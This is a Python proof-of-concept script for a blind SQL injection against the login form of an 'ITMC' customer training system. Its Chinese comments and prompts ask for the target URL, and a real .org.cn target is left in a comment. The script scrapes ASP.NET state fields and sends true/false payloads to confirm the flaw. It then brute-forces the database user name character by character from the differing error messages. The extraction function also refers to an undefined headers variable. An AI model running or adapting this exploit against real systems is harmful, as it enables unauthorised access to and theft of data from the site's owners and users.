#!/usr/bin/env python

#from ast import pattern
import re
import time
from tracemalloc import start
from urllib.request import proxy_bypass
from weakref import proxy
import requests
import urllib.parse
#import logging


#target = "http://zzds.itmc.org.cn/Cust/Login.aspx"

#proxies = {'http':'http://localhost:8080','https':'http://localhost:8080'}

payload_test1 = "admin\' and 1=1--"
payload_test2 = "admin\' and 1=2--"

payload_user = "admin\' and ascii(substring((user_name()),1,1))=100--"
payload_databases = "admin\'"+""+""
payload_tables = ""
payload_users = ""

def get_VIEWSTATE(r):
    pattern1 = r'VIEWSTATE\".*value=\".*\"'
    match=re.search(pattern1,r).group(0)
    pattern2=r'VIEWSTATE\" id=\"__VIEWSTATE\" value=\"'
    match1=re.split(pattern2,match)
    return match1[1][:-1]

def get_EVENTVALIDATION(r):
    pattern1=r'EVENTVALIDATION\".*value=\".*\"'
    match=re.search(pattern1,r).group(0);
    pattern2=r'EVENTVALIDATION\" id=\"__EVENTVALIDATION\" value=\"'
    match1=re.split(pattern2,match);
    return match1[1][:-1]; #返回_EVENTVALIDATION

def get_allDatabases(target):
    s = requests.session()
    result = ''

    for i in range(1,100):
        #print(i)
        for j in range(32, 123):

                res = s.get(url=target)
                payload = "\' and ascii(substring((user_name()),%d,1))=%d--" % (i,j)  
                data = {'username':payload,'password':'admin','__VIEWSTATE':get_VIEWSTATE(res.text), '__EVENTVALIDATION':get_EVENTVALIDATION(res.text), 'kuakaoLoginBtn':''}
                res = s.post(url=target, data=data, headers=headers)
                
                if "密码不正确" in res.text:
                    result += chr(j)
                    #print(result)
                    break
                else:
                    pass


        if result != '' and result == 'dbo':
            #print("SQL漏洞存在")
            print("结果为: "+result)
            break



def poc(target):
    s = requests.session()
    res = s.get(url=target)

    viewstate = get_VIEWSTATE(res.text)
    eventvalidation = get_EVENTVALIDATION(res.text)


    data1 = {'username':payload_test1,'password':'admin','__VIEWSTATE':viewstate, '__EVENTVALIDATION':eventvalidation, 'kuakaoLoginBtn':''}
    data2 = {'username':payload_test2,'password':'admin','__VIEWSTATE':viewstate, '__EVENTVALIDATION':eventvalidation, 'kuakaoLoginBtn':''}


    res_true = s.post(url=target, data=data1)
    res_false = s.post(url=target, data=data2)
    #print(res_true.text)
    #print(res_false.text)

    if "密码不正确" in res_true.text:
        if "帐号不存在" in res_false.text:
            print("SQL注入漏洞存在")
            # 输出一个数据证明
        else:
            print("SQL注入漏洞不存在")
    else:
        print("SQL注入漏洞不存在")


if __name__ == '__main__':
    target = str(input('请输入ITMC网点客户实训系统登陆页面的URL: '))
    poc(target)
    print("开始爆破数据\n")
    get_allDatabases(target)
